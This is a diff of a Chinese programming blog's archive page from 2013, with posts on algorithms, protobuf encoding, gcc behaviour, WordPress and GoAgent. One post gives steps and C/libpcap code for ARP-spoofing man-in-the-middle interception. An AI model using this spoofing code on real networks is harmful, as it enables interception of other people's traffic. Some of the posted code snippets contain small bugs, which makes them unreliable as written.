+			print "find"<br />
+			return<br />
+		else:<br />
+			print "not find"<br />
+			return</p>
+
+<p>sk=skipTable()<br />
+for i in xrange(100):<br />
+	sk.insert(random.randint(0,100))<br />
+for i in xrange(20):<br />
+	sk.delete(random.randint(0,100))</p>
+
+<p>t=sk.lefthead<br />
+headlist=[]<br />
+while t:<br />
+	headlist.append(t)<br />
+	t=t.downp<br />
+for i in headlist:<br />
+	while i:<br />
+		print i.value,<br />
+		i=i.rightp<br />
+	print <br />
+sk.find(101)<br />
+del(sk)</p>
+
+    </div>
+
+  
+    <ul class="tag_box inline">
+      <li><i class="icon-folder-open"></i></li>
+      
+      
+
+
+  
+    
+    	<li><a href="#program-ref">
+    		program <span>39</span>
+    	</a></li>
+    
+  
+
+
+
+    </ul>
+  
+
+  
+    <ul class="tag_box inline">
+      <li><i class="icon-tags"></i></li>
+      
+      
+
+
+  
+    
+  
+
+
+
+    </ul>
+  
+  </div>
+</div>
+
+
+<div class="page-header">
+  <h3><a href="/program/2013/04/26/%E5%85%B3%E4%BA%8Eprotocol-buffer-%E4%B8%AD%E7%9A%84base-128-varints%E7%BC%96%E7%A0%81">关于protocol buffer 中的Base 128 Varints编码 </a></h3>
+  <div class="date">
+    <span>26 April 2013</span>
+  </div>
+</div>
+
+<div class="row-fluid post-full">
+  <div class="span12">
+    <div class="content">
+      <p>首先大致讲下protocol buffer 是大google用来改变世界的……（不过要干掉xml json什么的我感觉再过二十年吧……好像解析的速度也没有那么的重要<br />
+其实具体的google的文档讲了很清楚了<br />
+https://developers.google.com/protocol-buffers/docs/encoding#simple<br />
+然后就是这个奇怪的新的编码、大致的好处我看下来感觉就是类似utf8那样可长可短根据数的大小来决定编码长度这样的<br />
+然后拿他官方例子来讲<br />
+比如300 来对他encode<br />
+首先先把他转成二进制、然后进行补0 补整字节的倍数也就8的倍数<br />
+然后进行逆序 最后对每个字节的8位进行填充、也就是每个字节的最高byte如果为1就是把后面那个字节的8位拿过来一起算、反正就是自己算<br />
+然后是decode 也就是一个反序 先根据每个字节的最高位拆开成独立的小块 然后以字节为单位进行反序 再然后去0把他十进制读出思想就是这样但是有点疑惑这个倒序的意义我是一直没有明白= =<br />
+好吧最后把代码贴出
+<pre lang="python">
+def encodebase128(ori):
+	t=str(bin(int(ori))[2:])
+	tmp=7
+	while len(t)>tmp:
+		tmp*=2
+	t='0'*(tmp-len(t))+t
+	ll=t[-7:]
+	for i in xrange(1,tmp/7):
+		ll+=t[-(i+1)*7:-i*7]
+	ans=""
+	for i in xrange(0,tmp/7):
+		ans+='0'
+		ans+=ll[i*7:(i+1)*7]
+	if tmp/7>1:
+		ans='1'+ans[1:]
+	return ans
+def decodebase128(dealed):
+	if len(dealed)%8!=0:
+		print 'illegal'
+	tt=dealed[-7:]
+	for i in xrange(len(dealed)/8-1,0,-1):
+		tt+=dealed[(i-1)*8+1:(i)*8]
+	return int('0b'+tt,2) 
+import sys
+t= encodebase128(sys.argv[1])
+print t
+print dealstring(t)</pre></p>
+
+<p></p>
+
+    </div>
+
+  
+    <ul class="tag_box inline">
+      <li><i class="icon-folder-open"></i></li>
+      
+      
+
+
+  
+    
+    	<li><a href="#program-ref">
+    		program <span>39</span>
+    	</a></li>
+    
+  
+
+
+
+    </ul>
+  
+
+  
+    <ul class="tag_box inline">
+      <li><i class="icon-tags"></i></li>
+      
+      
+
+
+  
+    
+  
+
+
+
+    </ul>
+  
+  </div>
+</div>
+
+
+<div class="page-header">
+  <h3><a href="/program/2013/04/09/list%E4%B8%AD%E5%88%A4%E6%96%AD%E6%98%AF%E5%90%A6%E5%AD%98%E5%9C%A8%E4%B8%89%E8%A7%92%E5%BD%A2%E4%B8%89%E8%BE%B9">list中判断是否存在三角形三边 </a></h3>
+  <div class="date">
+    <span>09 April 2013</span>
+  </div>
+</div>
+
+<div class="row-fluid post-full">
+  <div class="span12">
+    <div class="content">
+      <p>小时候数学好、因为能够有感觉知道每个条件他存在的意义、到了大学这种感觉渐渐消失了、直到今天突然那种感觉就回来了、因为那些条件恰恰是隐藏在数学自己的本身……<br />
+--------------------------------------------------------------------------<br />
+把这个感觉带回给我的恰恰就是这么一道题、这道题真的非常非常简单、可是给我带来了不小的顿悟。原题大致是先图里求个最短路径然后判断路径中是否有可以组成三角形的存在<br />
+也就是拆出了这么一个子问题、不知道是计算机编程写多了还是怎么样、已经逐渐开始依赖计算机强大的计算脑子都没半动一下就开始O(n^3)的暴力
+<pre lang="c++">
+for(int a=0; a < pcnt && !flag; a++)
+{
+    for(int b=a+1; b < pcnt && !flag; b++)
+    {
+        for(int c=b+1; c < pcnt && !flag; c++)
+        {
+            if(judge(pval[a],pval[b],pval[c]))
+            {
+                flag=true;
+            }
+        }
+    }
+}
+</pre>
+拿脚趾头想三次方肯定要TL、接着就是开始改进、首先想到了还是先对这些有意义的数组进行排序。然后使用自然而然的递增数组自己的优势那就是最小的两边之差一定是存在与相邻的数字里、注意这里就利用到了数字这个自身拥有美丽的属性的东西的属性。然后差不多代码是这样的
+<pre lang="c++">
+for (int a = 0; a < pcnt-2 && !flag; ++a)
+{
+    for(int j=a+1;j < pcnt-1 && !flag;j++)
+    {
+                    
+        if (pval[a] > (pval[j+1]-pval[j]))
+        {
+            flag=true;
+        }
+    }
+}
+</pre>
+复杂度是O(n^2)当我们使用了数字他自身的属性后、也就是相当于他自身的一个条件、我们把一个复杂度进行了指数级别的下降、这是多么美妙的事情？当然还没有完、因为我们还有一个隐藏条件<br />
+首先想想我们如何判定一个三角形<br />
+1.所有任意两边之和大于第三边<br />
+2.存在任意两边之差小于第三边<br />
+条件1其实就等于是3个条件、为什么对判断同一个东西却判断的条件不同？原因就是存在于他们的符号、因为减法这个运算他本身就更为苛刻破坏了数字之间那种稳定的感觉（对不起我实在没有专业知识来说明这个感觉是什么）而看起来要判断三次的加法就非常好的维护了这个感觉、也就是我们小时候做数学的那种条件是正正好好的感觉、只是现在他们隐藏于了数字本身<br />
+所以最终的代码其实非常简单</p>
+
+<p><pre lang="c++" /></p>
+
+<p>for(int i=0;i < pcnt-2;i++)<br />
+{
+    if(pval[i]+pval[i+1] > pv[i+2])<br />
+        break;<br />
+}
+
+通过数字他自身我们其实只需要O(n)足已</p>
+
+    </div>
+
+  
+    <ul class="tag_box inline">
+      <li><i class="icon-folder-open"></i></li>
+      
+      
+
+
+  
+    
+    	<li><a href="#program-ref">
+    		program <span>39</span>
+    	</a></li>
+    
+  
+
+
+
+    </ul>
+  
+
+  
+    <ul class="tag_box inline">
+      <li><i class="icon-tags"></i></li>
+      
+      
+
+
+  
+    
+  
+
+
+
+    </ul>
+  
+  </div>
+</div>
+
+
+<div class="page-header">
+  <h3><a href="/program/2013/04/04/beauty-of-programming-%E7%BB%83%E4%B9%A0%E8%B5%9B%E7%AC%AC%E4%B8%89%E9%A2%98">beauty of programming 练习赛第三题 </a></h3>
+  <div class="date">
+    <span>04 April 2013</span>
+  </div>
+</div>
+
+<div class="row-fluid post-full">
+  <div class="span12">
+    <div class="content">
+      <p>先看题</p>
+
+<p><h4>题目列表 > 踩方格</h4>
+</p>
+
+<p><div class="coding-problem">		<br />
+	<p>时间限制: 1000ms    内存限制: 1024MB</p>
+    <p /><h3>描述</h3><p>有一个方格矩阵，矩阵边界在无穷远处。我们做如下假设：<br />a.    每走一步时，只能从当前方格移动一格，走到某个相邻的方格上；<br />b.    走过的格子立即塌陷无法再走第二次；<br />c.    只能向北、东、西三个方向走；<br />请问：如果允许在方格矩阵上走n步，共有多少种不同的方案。2种走法只要有一步不一样，即被认为是不同的方案。</p><h3>输入</h3><p>允许在方格上行走的步数n</p><h3>输出</h3><p>计算出的方案数量</p><p><br /></p>对于小数据1 &lt;= n &lt;= 20; 对于大数据1 &lt;= n &lt;= 100.<p><br /></p></div></p>
+	<dl class="content">
+		<dt>样例输入</dt>
+		<dd><pre>2</pre></dd>
+		<dt>样例输出</dt>
+		<dd><pre>7</pre></dd>
+	</dl>
+
+<p>这个题目我觉得最大的阴谋就是对于小数据1 <= n <= 20; 对于大数据1 <= n <= 100.<br />
+我了个fuck了给了个那么小规模的数据还给那么高的分值正常人理所当然的就肯定认为这是个指数级的运算了啊！然后我就想到了三叉树去暴力啊、可是再怎么暴力这个指数摆在那就算是100也很恐怖了、各种挂……纠结了好久好久写了好几种都挂<br />
+最后静下心来把他当数学做……然后草稿纸写写……尼玛5分钟就算出来了……<br />
+其实思想非常非常简单 往北的节点就是能叉出3条路、其中分别是继续叉2的2条以及继续叉3的一条、往两侧的每次只能叉出两条路、分别是2 和3 具体路径的结构问你了么？去暴力做等于就是浪费这些路径的信息啊小时候怎么做数学题的……要那么多条件吃屎啊……数学规律就是这么简单……然后还不会写么？……！你妹的别说100了来个平方这复杂度都闭着眼睛来的啊……
+<pre lang="c">
+#include <stdio.h>
+int main(){
+    int a=0;
+    int b=1;
+    int count＝0;
+    int i=0;
+    int temp;
+    scanf("%d",&count);
+    for (i=0; i<count-1; i++) {
+        temp=a;
+        a+=(2*b);
+        b+=temp;
+    }
+    printf("%d\n",2*a+3*b);
+    return 0;
+}
+</stdio.h></pre>
+没了！没了！写完了！……………………突然有种回归最质朴的感觉真好……</p>
+
+    </div>
+
+  
+    <ul class="tag_box inline">
+      <li><i class="icon-folder-open"></i></li>
+      
+      
+
+
+  
+    
+    	<li><a href="#program-ref">
+    		program <span>39</span>
+    	</a></li>
+    
+  
+
+
+
+    </ul>
+  
+
+  
+    <ul class="tag_box inline">
+      <li><i class="icon-tags"></i></li>
+      
+      
+
+
+  
+    
+  
+
+
+
+    </ul>
+  
+  </div>
+</div>
+
+
+<div class="page-header">
+  <h3><a href="/%E6%9C%AA%E5%88%86%E7%B1%BB/2013/03/29/%E7%9D%A1%E7%9C%A0%E6%8E%92%E5%BA%8Fshell%E5%AE%9E%E7%8E%B0">睡眠排序shell实现 </a></h3>
+  <div class="date">
+    <span>29 March 2013</span>
+  </div>
+</div>
+
+<div class="row-fluid post-full">
+  <div class="span12">
+    <div class="content">
+      <p>又是无意看到群里在讨论东西看到个睡眠排序……觉得好玩的就分享分享<br />
+代码如下（简单的过分 想说的话都写注释里了)
+<pre lang="shell">
+#!/bin/bash
+function f() {
+    sleep "$1"
+    echo "$1"  
+}
+while [ -n "$1" ]
+do
+    f "$1" & 
+    shift   #对所有参数 依次循环让所有的参数分别sleep进行次根据sleep长短利用数字自身大小的特性进行排序
+done
+wait  #主进程等到全部子进程结束后返回结束
+#这个排序有个致命伤 如果os调度高于了数字最小的差值比如就必定会出错 或者随便来个来自系统的别的竞争也肯定悲剧了
+#还有就是……万一这个数字很大你等到明年去么混蛋= =
+</pre></p>
+
+    </div>
+
+  
+    <ul class="tag_box inline">
+      <li><i class="icon-folder-open"></i></li>
+      
+      
+
+
+  
+    
+    	<li><a href="#未分类-ref">
+    		未分类 <span>3</span>
+    	</a></li>
+    
+  
+
+
+
+    </ul>
+  
+
+  
+    <ul class="tag_box inline">
+      <li><i class="icon-tags"></i></li>
+      
+      
+
+
+  
+    
+  
+
+
+
+    </ul>
+  
+  </div>
+</div>
+
+
+<div class="page-header">
+  <h3><a href="/program/2013/03/28/%E5%85%B3%E4%BA%8Egcc%E4%BC%98%E5%8C%96%E6%8B%B7%E8%B4%9D%E6%9E%84%E9%80%A0-5">关于gcc优化拷贝构造 </a></h3>
+  <div class="date">
+    <span>28 March 2013</span>
+  </div>
+</div>
+
+<div class="row-fluid post-full">
+  <div class="span12">
+    <div class="content">
+      <p>今天碰到一个很奇怪的问题……(我大一的时候怎么没有发觉呢Orz<br />
+代码如下
+<pre lang="c">
+#include <iostream>
+using namespace std;
+class Student {
+    
+public:
+    Student(){cout<<"structure"<<endl;}
+    Student(const Student &temp)
+    {</iostream></pre></p>
+
+<p>        cout<<"copy structure"<<endl;<br />
+    }<br />
+    ~Student(){</p>
+
+<p>        cout<<"free"<<endl;}<br />
+    Student  operator + (const Student &) const<br />
+    {<br />
+        Student temp;<br />
+        return temp; <br />
+    }<br />
+};<br />
+int main(int argc, const char * argv[])<br />
+{</p>
+
+<p>    Student s1;<br />
+    Student s2(s1+s1);<br />
+    return 0;<br />
+}
+
+输出应该很简单<br />
+------------------<br />
+structure<br />
+structure<br />
+copy structure<br />
+free<br />
+copy structure<br />
+free<br />
+free<br />
+free<br />
+-----------------<br />
+return 返回临时变量时应该拷贝构造一次<br />
+可是问题来了 死活出的结果就是<br />
+----------------<br />
+structure<br />
+structure<br />
+free<br />
+free<br />
+----------------<br />
+折腾了大半天后我终于还是发现原来还是编译器搞的鬼……(人家只是太智能不要黑他<br />
+具体就是在return temp;那里应该隐式调用拷贝构造的地方编译器做了延长temp的生命周期、延长到外部s2来让s2的生命周期结束后对这块内存进行析构<br />
+这样就可以少了第一次拷贝构造<br />
+此时第二次需要把新对象拷贝到s2中时的拷贝也就在这里被一起优化掉了直接让s2对应到了temp这块内存上(以上是我对编译器优化过程的的猜测<br />
+然后我就试着<br />
+g++ -o test -O0 test.cpp<br />
+这么编译还是不行<br />
+于是我就放弃了(只好理解成gcc的最白痴的不进行优化编译也会处理掉这种隐式的拷贝构造<br />
+但是我错了！！！<br />
+我严重鄙视下大多数网上放gcc参数的文档的那些人不负责任的就是-O0就是不优化（混蛋不优化不等于最低级优化好么！<br />
+-----------------<br />
+然后终于在帮忙下找到了http://blog.csdn.net/daidodo/article/details/2185217这篇文章<br />
+-fno-elide-constructors 强制g++总是调用copy构造函数，即使在用临时对象初始化另一个同类型对象的时候。<br />
+就是这个参数<br />
+好了一切其实也就搞定了<br />
+g++ -o test -fno-elide-constructors test.cpp</p>
+
+<p>结束语:怪也只能怪gcc太尼玛智能了……我大概知道为什么开始教学中要用vc环境了</p>
+
+    </div>
+
+  
+    <ul class="tag_box inline">
+      <li><i class="icon-folder-open"></i></li>
+      
+      
+
+
+  
+    
+    	<li><a href="#program-ref">
+    		program <span>39</span>
+    	</a></li>
+    
+  
+
+
+
+    </ul>
+  
+
+  
+    <ul class="tag_box inline">
+      <li><i class="icon-tags"></i></li>
+      
+      
+
+
+  
+    
+  
+
+
+
+    </ul>
+  
+  </div>
+</div>
+
+
+<div class="page-header">
+  <h3><a href="/life/2013/03/26/%E6%B3%A8%E5%86%8C%E4%BA%86-ask-fm">注册了 ask.fm </a></h3>
+  <div class="date">
+    <span>26 March 2013</span>
+  </div>
+</div>
+
+<div class="row-fluid post-full">
+  <div class="span12">
+    <div class="content">
+      <p><a href="http://ask.fm/ZhangXinZheng" target="_blank">http://ask.fm/ZhangXinZheng</a>
+一个人自问自答好无聊、求骚扰</p>
+
+    </div>
+
+  
+    <ul class="tag_box inline">
+      <li><i class="icon-folder-open"></i></li>
+      
+      
+
+
+  
+    
+    	<li><a href="#life-ref">
+    		life <span>5</span>
+    	</a></li>
+    
+  
+
+
+
+    </ul>
+  
+
+  
+    <ul class="tag_box inline">
+      <li><i class="icon-tags"></i></li>
+      
+      
+
+
+  
+    
+  
+
+
+
+    </ul>
+  
+  </div>
+</div>
+
+
+<div class="page-header">
+  <h3><a href="/program/2013/03/20/arp%E6%AC%BA%E9%AA%97%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB%E7%9A%84%E5%AE%9E%E7%8E%B0%E3%80%81arp%E5%8C%85%E8%A7%A3%E6%9E%90">arp欺骗中间人攻击的实现、arp包解析 </a></h3>
+  <div class="date">
+    <span>20 March 2013</span>
+  </div>
+</div>
+
+<div class="row-fluid post-full">
+  <div class="span12">
+    <div class="content">
+      <p>首先先是了解下什么arp欺骗 可以参加这篇文章http://www.ahstu.edu.cn/wlzx/HTML/20090923173022.shtml<br />
+看完这篇文章我们就可以实施攻击<br />
+1.首先登陆自己的路由器 先对自己准备攻击的机器获得mac地址的信息（在真正攻击时需要用嗅探广发同个子网下的arp广播来获得mac地址）<br />
+2.对被攻击的mac地址绑定静态ip（这步在真正攻击时并不需要、我只是为了方便）<br />
+3.在路由器中进行绑定把被攻击者的ip的绑定到攻击者的mac地址（在真正攻击时对路由器发送欺骗的ARP欺骗响应在之后会说到）<br />
+4.对被攻击者发送arp欺骗应答使之网关的mac地址映射到攻击者的机器上或者简单的 arp -s attack's mac gateway就可以了<br />
+------------------ARP表的设置基本完成----------------------------------------------------------------------------<br />
+接下去需要打开自己网卡的路由功能（这个可以简单的打开共享网络来做到)<br />
+然后开个wireshark什么就安安静静的看着来回所有的数据全给抓到就可以了:P<br />
+------------------上面只是理想情况是你知道路由器密码别的情况你该怎么办？被攻击的人能老老实实给你用他电脑么?------------<br />
+接下去我们要分析下arp数据包<a href="http://snorlax-wordpress.stor.sinaapp.com/uploads/2013/03/54A4717D-5EB0-4B9A-9D84-10A71FC0A72C.jpg"><img src="http://snorlax-wordpress.stor.sinaapp.com/uploads/2013/03/54A4717D-5EB0-4B9A-9D84-10A71FC0A72C.jpg" alt="" title="54A4717D-5EB0-4B9A-9D84-10A71FC0A72C" width="680" height="232" class="alignnone size-full wp-image-299" /></a>
+然后我从真实抓下来的arp进行分析<br />
+首先arp广播包是 42个字节<br />
+arp响应包是60个字节(后面18个我实在没搞明白是什么……反正我乱填也是成功就是的了<br />
+然后我贴代码对这42个字节进行具体分析<br />
+因为socket的封装都在ip之上的……unp上查到的sock_packet我在mac上死活也没找到= =<br />
+不过我发现给在数据连路层上的更好的一组东西:)<br />
+神器不解释啊= =<br />
+详见<br />
+http://dog.tele.jp/winpcapeng/html/group__wpcap__fn.html</p>
+
+<p><pre lang="c">
+#include <stdlib.h>
+#include <stdio.h /></stdlib.h></pre></p>
+
+<p>#include <pcap.h /></p>
+
+<p>int main(int argc, char **argv) {<br />
+    pcap_t *fp;<br />
+    char error[PCAP_ERRBUF_SIZE];<br />
+    u_char packet[60];<br />
+    int i;<br />
+    <br />
+    /* Check the validity of the command line */<br />
+    if (argc != 2)<br />
+    {<br />
+        printf("usage: %s inerface", argv[0]);<br />
+        return -1;<br />
+    }<br />
+    <br />
+    /* Open the output adapter */<br />
+    if((fp = pcap_open_live("en0", 100, 1, 1000, error) ) == NULL)<br />
+    {<br />
+        fprintf(stderr,"\nError opening adapter: %s\n", error);<br />
+        return -1;<br />
+    }<br />
+    <br />
+    /* Supposing to be on ethernet, set mac destination to 1:1:1:1:1:1 */<br />
+    /*被攻击者的mac*/<br />
+    packet[0]=xx;<br />
+    packet[1]=32;<br />
+    packet[2]=102;<br />
+    packet[3]=8;<br />
+    packet[4]=jiubu;<br />
+    packet[5]=gaosuni;<br />
+    <br />
+    /* set mac source to 2:2:2:2:2:2 */<br />
+    /*攻击者的mac*/<br />
+    packet[6]=jiu;<br />
+    packet[7]=bu;<br />
+    packet[8]=gaosu;<br />
+    packet[9]=234;<br />
+    packet[10]=xx;<br />
+    packet[11]=100;<br />
+    /*arp*/<br />
+    packet[12]=8;<br />
+    packet[13]=6;<br />
+    /*arp首部*/<br />
+    packet[14]=0;<br />
+    packet[15]=1;<br />
+    <br />
+    packet[16]=8;<br />
+    packet[17]=0;<br />
+    <br />
+    packet[18]=6;<br />
+    packet[19]=4;<br />
+    packet[20]=0;<br />
+    packet[21]=2;<br />
+    /*被骗的那个人的arp表上的假mac*/<br />
+    packet[22]=jiu;<br />
+    packet[23]=154;<br />
+    packet[24]=32;<br />
+    packet[25]=bu;<br />
+    packet[26]=253;<br />
+    packet[27]=gao;<br />
+    /*被骗者的网关*/<br />
+    packet[28]=192;<br />
+    packet[29]=168;<br />
+    packet[30]=1;<br />
+    packet[31]=1;<br />
+    /*被攻击者的mac*/<br />
+    packet[32]=xx;<br />
+    packet[33]=32;<br />
+    packet[34]=102;<br />
+    packet[35]=xx;<br />
+    packet[36]=xx;<br />
+    packet[37]=184;<br />
+    /*被攻击者的ip*/<br />
+    packet[38]=192;<br />
+    packet[39]=168;<br />
+    packet[40]=1;<br />
+    packet[41]=114;<br />
+    <br />
+    /* Fill the rest of the packet */<br />
+    /*乱填就好了*/<br />
+    for(i=42;i<60;i++){<br />
+        packet[i]=i%256;<br />
+    }<br />
+    <br />
+    /* Send down the packet */<br />
+    pcap_sendpacket(fp,<br />
+                    packet,<br />
+                    60);<br />
+    <br />
+    return 0;<br />
+}
+</p>
+
+<p>以上arp欺骗的完整实现、不要用来干坏事= =</p>
+
+    </div>
+
+  
+    <ul class="tag_box inline">
+      <li><i class="icon-folder-open"></i></li>
+      
+      
+
+
+  
+    
+    	<li><a href="#program-ref">
+    		program <span>39</span>
+    	</a></li>
+    
+  
+
+
+
+    </ul>
+  
+
+  
+    <ul class="tag_box inline">
+      <li><i class="icon-tags"></i></li>
+      
+      
+
+
+  
+    
+  
+
+
+
+    </ul>
+  
+  </div>
+</div>
+
+
+<div class="page-header">
+  <h3><a href="/program/2013/03/15/sae-%E6%99%AE%E9%80%9A%E5%BC%80%E5%8F%91%E8%80%85%E5%85%8D%E6%8E%A8%E8%8D%90%E8%AE%A4%E8%AF%81%E6%B4%BB%E5%8A%A83-15-%E8%A7%A3">sae 普通开发者免推荐认证活动3.15 解 </a></h3>
+  <div class="date">
+    <span>15 March 2013</span>
+  </div>
+</div>
+
+<div class="row-fluid post-full">
+  <div class="span12">
+    <div class="content">
+      <p><a href="http://cloudbbs.org/forum.php?mod=viewthread&amp;tid=12876">大家好我是传送门</a></p>
+
+<p>活动如上<br />
+主要题干是<br />
+请将昨天的100位数字，使用你熟悉的编程语言，首先将其由字符串转换为长度为100的整数数组；其次，对数组进行排序，实现奇数在左边，偶数在右边，并且分别有序，希望最多只使用O(1)的空间复杂度（如能不借助额外空间实现排序，首位完成者将有惊喜~）。</p>
+
+<p>数字如下：31415926535897932384626433832795028841971693993751058209749445923078164062862089986280348253421170679821480865132823</p>
+
+<p>其实难度也不大、主要就是想出了一个非常巧妙的方法解决<br />
+首先没有时间复杂度要求 但对空间要求零空间 脑子第一反应就是快排 但是最大的问题就是如何再零空间下把奇偶分开然后分别快排即可<br />
+就是两个游标的交互替换、写出来就是感觉非常巧妙啦:)</p>
+
+<p>代码如下</p>
+
+<p><pre lang="python">
+i=-1
+j=0
+pi = "31415926535897932384626433832795028841971693993751058209749445923078164062862089986280348253421170679821480865132823"
+l = [int(tt) for tt in pi[:100]]
+while j<100:
+    if l[j]%2==0:
+        pass
+    else:
+        i+=1
+        l[i],l[j]=l[j],l[i]
+    j+=1</pre></p>
+
+<p>print sorted(l[0:i+1])+sorted(l[i+1:100])
+
+经过评论大哥的指点python的实现
+<pre lang="python">
+pi = "31415926535897932384626433832795028841971693993751058209749445923078164062862089986280348253421170679821480865132823"
+l=[int(tt) for tt in pi[:100]]
+l.sort(lambda x,y:(x-y)if(x%2-y%2==0)else(y%2-x%2))
+print l
+</pre></p>
+
+    </div>
+
+  
+    <ul class="tag_box inline">
+      <li><i class="icon-folder-open"></i></li>
+      
+      
+
+
+  
+    
+    	<li><a href="#program-ref">
+    		program <span>39</span>
+    	</a></li>
+    
+  
+
+
+
+    </ul>
+  
+
+  
+    <ul class="tag_box inline">
+      <li><i class="icon-tags"></i></li>
+      
+      
+
+
+  
+    
+  
+
+
+
+    </ul>
+  
+  </div>
+</div>
+
+
+<div class="page-header">
+  <h3><a href="/program/2013/03/09/%E5%85%B3%E4%BA%8Ewordpress-%E5%90%8C%E6%AD%A5twitter%E5%8A%A0%E7%9F%AD%E5%9C%B0%E5%9D%80%E6%9C%8D%E5%8A%A1">关于wordpress 同步twitter加短地址服务 </a></h3>
+  <div class="date">
+    <span>09 March 2013</span>
+  </div>
+</div>
+
+<div class="row-fluid post-full">
+  <div class="span12">
+    <div class="content">
+      <p>1.首先安装依赖http://wordpress.org/extend/plugins/social/<br />
+2.再安装上 https://wordpress.org/extend/plugins/twitter-tools/</p>
+
+<p>这样就其实已经可以在发布的时候同步到twitter上了、但是有一个问题那就是url是全长度输出的、在限制长度的twitter下这是个非常大的问题<br />
+所以我修改了下源码用了sina的短地址服务（大sina把google api给墙掉了残年……<br />
+-----------------------------------------------------------------------------------------------------------<br />
+具体操作如下<br />
+1.首先从wordpress的根目录开始寻址到/wp-content/plugins/social/views/wp-admin/post/broadcast/options.php （我们需要修改文件就在这<br />
+2.找到第70行 其实我们从这里就可以看出$account['content']里就是我们发出的文本段（鉴于本人太懒不高兴往上找了所以就直接在这段做处理<br />
+3.先用正则式剔出我们blog的url 然后对他进行shorten再替换回去
+<pre lang="php">
+<?php
+    preg_match("#http\://snorlax\.sinaapp\.com/\?p\=\d+#",$account['content'],$matches);
+    $apiKey='3818214747';
+    //调用sina的api 注:这个api在文档显示正在走向废弃的道路所以随时有可能挂也说不定= =
+    //具体调用方法参考http://open.weibo.com/wiki/Short_url/shorten
+    $apiUrl='http://api.t.sina.com.cn/short_url/shorten.json?source='.$apiKey.'&url_long='.$matches[0];
+    $response = file_get_contents($apiUrl);
+    $json = json_decode($response);
+    $tar=str_replace($matches[0],$json[0]->url_short,$account['content']);
+    echo esc_textarea($tar);
+	echo "<p class="\\"readonly\">; 
+	echo esc_textarea($tar); 
+?>
+</p></pre></p>
+
+<p>然后跑起来就ok了<br />
+修改完后的文件附上:<a href="http://snorlax-wordpress.stor.sinaapp.com/uploads/2013/03/options.php_.zip">options.php</a></p>
+
+    </div>
+
+  
+    <ul class="tag_box inline">
+      <li><i class="icon-folder-open"></i></li>
+      
+      
+
+
+  
+    
+    	<li><a href="#program-ref">
+    		program <span>39</span>
+    	</a></li>
+    
+  
+
+
+
+    </ul>
+  
+
+  
+    <ul class="tag_box inline">
+      <li><i class="icon-tags"></i></li>
+      
+      
+
+
+  
+    
+  
+
+
+
+    </ul>
+  
+  </div>
+</div>
+
+
+<div class="page-header">
+  <h3><a href="/program/2013/03/07/%E5%85%B3%E4%BA%8Eios%E4%B8%8B%E7%9A%84goagent%E4%BD%BF%E7%94%A8">关于ios下的goagent使用 </a></h3>
+  <div class="date">
+    <span>07 March 2013</span>
+  </div>
+</div>
+
+<div class="row-fluid post-full">
+  <div class="span12">
+    <div class="content">
+      <p>国际惯例先问候下方滨兴你这狗娘养的<br />
+-----------------------------------------------------------------------------------<br />
+首先说下我的server的版本是2.1.3<br />
+ios下的goagent各种教程到处都是、可是只可惜共军太狡猾、gfw现在是越来越牛逼<br />
+反正我搜着的各种帖子要么是那种二到家的就装装装下去就成功了、要么就是中间某个步骤被干掉了<br />
+ 
+正常人都肯定会看官方的文档、可惜没那么简单……<del datetime="2013-03-07T06:08:41+00:00">https://code.google.com/p/goagent/wiki/GoAgent_IOS</del>
+这上面的版本由于过于古老让我吃尽苦头<br />
+好了废话到此位置<br />
+-----------------------------------------------------------------------------------<br />
+由于官方那个是把python包直接内嵌在里面的所以第一步装python<br />
+为了一下操作方便点可以安装下open ssh以及aptbackup(用了这个就可以直接用apt-get了<br />
+1.这个可以直接在178的源里搜索安装python2.7<br />
+2.在big boss源中安装adv-cmds（是下一步的依赖<br />
+3.接下去就是goagent了 https://code.google.com/p/goagent/downloads/detail?name=goagent-local-1.7.deb&can=2&q=(debian包安装可以采取dpkg -i 或者就索性丢到/var/root/Media/Cydia/AutoInstall 重启下<br />
+4.安装方便的工具栏 有两种选择 第一是先装sbsetting依赖（有一串东西）然后装178源里的goagent-toggle 第二就是用之前的goagent-ios 在里面的/Applications/goagent-ios.app/goagent-local/proxy.py做一个映射到/var/mobile/goagent-local/proxy.py（前者是在sbsetting中进行开关、后者是在通知栏最下放有个按键进行开关）<br />
+5.配置goagent中的appid、以及更改为google_hk(若用google_cn请把hosts中的域名更改为响应的ip地址、isp不提供解析)配置当前网络下的pac 地址在 file://localhost/stash/Applications/MobileSafari.app/8087.pac 在当前wifi里的http proxy中填写<br />
+以上你已经在http情况下翻过去了<br />
+6.现在要安装ca、这个正常看起来简单暴的事情、由于你现在根本在没翻的前提下变的异常困难不过你可以发现goagent-local里其实已经有了很多ca了、把/var/mobile/goagent-local/certs/apis.google.com.crt 拷贝出来（如果本机可以翻墙可以直接把https://goagent.googlecode.com/files/CA.crt下载下来用并跳到8） 然后如果自己有python环境就用传说中两行的web服务器把ca给共享出去
+<pre lang="python">
+import SimpleHTTPServer
+SimpleHTTPServer.test()
+</pre>
+7.在safari访问这个然后下一步安装、到这就可以轻易的safari访问 https://goagent.googlecode.com/files/CA.crt 装他的ca了</p>
+
+<p>8.你自由了:-)</p>
+
+<p>ps.以上的server的环境是在2.1.3的基础上server我放了个压缩包<a href="http://snorlax-wordpress.stor.sinaapp.com/uploads/2013/03/server1.zip">server</a></p>
+
+<p></p>
+
+    </div>
+
+  
+    <ul class="tag_box inline">
+      <li><i class="icon-folder-open"></i></li>
+      
+      
+
+
+  
+    
+    	<li><a href="#program-ref">
+    		program <span>39</span>
+    	</a></li>
+    
+  
+
+
+
+    </ul>
+  
+
+  
+    <ul class="tag_box inline">
+      <li><i class="icon-tags"></i></li>
+      
+      
+
+
+  
+    
+  
+
+
+
+    </ul>
+  
+  </div>
+</div>
+
+
+<div class="page-header">
+  <h3><a href="/%E6%9C%AA%E5%88%86%E7%B1%BB/2013/01/29/%E5%85%B3%E4%BA%8Ewindows%E9%87%8C%E7%9A%84python%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE">关于windows里的python环境配置 </a></h3>
+  <div class="date">
+    <span>29 January 2013</span>
+  </div>
+</div>
+
+<div class="row-fluid post-full">
+  <div class="span12">
+    <div class="content">
+      <p>首先windows下面没有类似bpython、ipython等神器……<br />
+很小很小的东西当然可以用sublime text2但是稍微复杂点的没有一个好点的ide还是不行的<br />
+先是推荐一个不错的ide是jetbrains做的pycharm、根据这牌子名可想而知肯定是不错的啦、但可惜人家是收费的（当盗版狗是不好的行为……<br />
+然后选择了eclipse+pydev、试用了下效果还是非常不错的（应该是新电脑跑eclispe非常流畅的缘故了啦（¯﹃¯）<br />
+个么要装分别就是<br />
